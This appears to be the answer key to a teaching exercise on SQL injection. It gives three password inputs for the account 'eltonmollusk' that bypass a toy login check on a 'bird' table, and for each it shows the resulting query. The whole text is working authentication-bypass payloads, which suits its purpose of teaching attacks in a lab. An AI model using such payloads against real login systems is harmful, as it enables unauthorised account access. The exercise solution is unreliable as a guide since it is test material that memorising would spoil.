# BEGIN_SOLUTION

username

    eltonmollusk

password

    '='' AND username='eltonmollusk'--

The two dashes start a line comment which discards the rest of the query.

Enter the username and password and any message. The query will be

    SELECT username FROM bird WHERE ''='' AND username='eltonmollusk'--' = password AND username = 'eltonmollusk'

which evaluates to the rows [('eltonmollusk',)]. These rows pass the test below:

    if len(rows) == 1 and rows[0][0] == username

An alternative password is

    eltonmollusk' = username OR '

which will result in the query

    SELECT username FROM bird WHERE 'eltonmollusk' = username OR '' = password and username = 'eltonmollusk'

The shortest solution is probably

    '='' AND NOT '

resulting in the query

    SELECT username FROM bird WHERE ''='' AND NOT '' = password AND username = 'eltonmollusk'
